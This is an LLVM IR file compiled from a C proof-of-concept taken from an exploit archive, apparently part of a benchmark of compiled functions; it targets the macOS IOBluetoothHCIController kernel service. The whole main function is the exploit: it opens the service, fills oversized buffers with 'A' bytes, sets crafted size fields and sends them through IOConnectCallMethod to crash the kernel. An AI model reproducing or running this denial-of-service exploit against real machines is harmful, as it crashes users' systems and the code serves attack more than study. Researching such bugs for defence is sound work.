; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35772.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35772.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.BluetoothCall = type { i32*, i32, i8** }

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"IOBluetoothHCIController\00", align 1
@kIOReturnSuccess = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [47 x i8] c" [+] Opened connection to service on port: %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"\\x%02x\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [10 x i8] c"kr: %08x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.BluetoothCall, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @kIOMasterPortDefault, align 4
  %8 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 @IOServiceGetMatchingService(i32 %7, i32 %8)
  store i32 %9, i32* %2, align 4
  %10 = load i32, i32* %2, align 4
  %11 = icmp ne i32 %10, 0
  br i1 %11, label %13, label %12

12:                                               ; preds = %0
  store i32 -1, i32* %1, align 4
  br label %92

13:                                               ; preds = %0
  store i32 0, i32* %3, align 4
  %14 = load i32, i32* %2, align 4
  %15 = call i32 (...) @mach_task_self()
  %16 = call i32 @IOServiceOpen(i32 %14, i32 %15, i32 0, i32* %3)
  store i32 %16, i32* %4, align 4
  %17 = load i32, i32* %2, align 4
  %18 = call i32 @IOObjectRelease(i32 %17)
  %19 = load i32, i32* %4, align 4
  %20 = load i32, i32* @kIOReturnSuccess, align 4
  %21 = icmp ne i32 %19, %20
  br i1 %21, label %22, label %24

22:                                               ; preds = %13
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %1, align 4
  br label %92

24:                                               ; preds = %13
  %25 = load i32, i32* %3, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0), i32 %25)
  %27 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %28 = load i32*, i32** %27, align 8
  %29 = getelementptr inbounds i32, i32* %28, i64 0
  store i32 4096, i32* %29, align 4
  %30 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %31 = load i32*, i32** %30, align 8
  %32 = getelementptr inbounds i32, i32* %31, i64 0
  %33 = load i32, i32* %32, align 4
  %34 = call i64 @calloc(i32 %33, i32 1)
  %35 = inttoptr i64 %34 to i8*
  %36 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 2
  %37 = load i8**, i8*** %36, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  store i8* %35, i8** %38, align 8
  %39 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %40 = load i32*, i32** %39, align 8
  %41 = getelementptr inbounds i32, i32* %40, i64 1
  store i32 264, i32* %41, align 4
  %42 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %43 = load i32*, i32** %42, align 8
  %44 = getelementptr inbounds i32, i32* %43, i64 1
  %45 = load i32, i32* %44, align 4
  %46 = call i64 @calloc(i32 %45, i32 1)
  %47 = inttoptr i64 %46 to i8*
  %48 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 2
  %49 = load i8**, i8*** %48, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  store i8* %47, i8** %50, align 8
  %51 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 2
  %52 = load i8**, i8*** %51, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 0
  %56 = load i32*, i32** %55, align 8
  %57 = getelementptr inbounds i32, i32* %56, i64 1
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @memset(i8* %54, i8 signext 65, i32 %58)
  %60 = getelementptr inbounds %struct.BluetoothCall, %struct.BluetoothCall* %5, i32 0, i32 1
  store i32 45, i32* %60, align 8
  store i32 0, i32* %6, align 4
  br label %61

61:                                               ; preds = %78, %24
  %62 = load i32, i32* %6, align 4
  %63 = icmp slt i32 %62, 120
  br i1 %63, label %64, label %81

64:                                               ; preds = %61
  %65 = load i32, i32* %6, align 4
  %66 = srem i32 %65, 8
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %68, label %70

68:                                               ; preds = %64
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  br label %70

70:                                               ; preds = %68, %64
  %71 = bitcast %struct.BluetoothCall* %5 to i8*
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32 %76)
  br label %78

78:                                               ; preds = %70
  %79 = load i32, i32* %6, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %6, align 4
  br label %61

81:                                               ; preds = %61
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %83 = load i32, i32* @stdout, align 4
  %84 = call i32 @fflush(i32 %83)
  %85 = load i32, i32* %3, align 4
  %86 = bitcast %struct.BluetoothCall* %5 to i8*
  %87 = call i32 @IOConnectCallMethod(i32 %85, i32 0, i32* null, i32 0, i8* %86, i32 24, i32* null, i32* null, i32* null, i32* null)
  store i32 %87, i32* %4, align 4
  %88 = load i32, i32* %4, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i32 %88)
  %90 = load i32, i32* %3, align 4
  %91 = call i32 @IOServiceClose(i32 %90)
  store i32 %91, i32* %1, align 4
  br label %92

92:                                               ; preds = %81, %22, %12
  %93 = load i32, i32* %1, align 4
  ret i32 %93
}

declare dso_local i32 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @IOServiceOpen(i32, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @IOObjectRelease(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @calloc(i32, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @IOServiceClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
